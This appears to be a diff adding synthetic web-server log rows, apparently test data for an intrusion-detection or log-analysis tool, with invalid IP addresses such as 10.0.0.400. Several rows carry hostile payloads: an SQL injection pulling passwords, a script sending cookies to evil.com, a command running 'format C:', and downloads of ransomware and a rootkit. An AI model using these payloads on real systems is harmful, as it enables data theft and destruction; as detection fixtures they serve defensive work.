@@ -1,0 +1,10 @@
+2024-01-15T10:50:15Z,192.168.1.500,10.0.0.400,curl/7.68.0,https://malware.example.com/download/ransomware.exe,GET,200,10240,5120
+2024-01-15T10:50:20Z,192.168.1.501,10.0.0.401,sqlmap/1.5.12,https://example.com/api/admin' UNION SELECT password FROM users WHERE admin=1,POST,400,128,64
+2024-01-15T10:50:25Z,192.168.1.502,10.0.0.402,nmap/7.80,https://example.com/admin/panel,GET,403,512,256
+2024-01-15T10:50:30Z,192.168.1.503,10.0.0.403,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,https://example.com/search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>,GET,400,128,64
+2024-01-15T10:50:35Z,192.168.1.504,10.0.0.404,hydra/9.1,https://example.com/login,POST,401,256,128
+2024-01-15T10:50:40Z,192.168.1.505,10.0.0.405,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,https://example.com/downloads/rootkit.sys,GET,200,4096,2048
+2024-01-15T10:50:45Z,192.168.1.506,10.0.0.406,nikto/2.1.6,https://example.com/phpmyadmin,GET,403,512,256
+2024-01-15T10:50:50Z,192.168.1.507,10.0.0.407,gobuster/3.1.0,https://example.com/wp-admin,GET,404,256,128
+2024-01-15T10:50:55Z,192.168.1.508,10.0.0.408,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,https://example.com/api/cmd?exec=cmd.exe&args=/c+format+C:,GET,400,128,64
+2024-01-15T10:51:00Z,192.168.1.509,10.0.0.409,dirb/2.22,https://example.com/admin,GET,403,512,256 
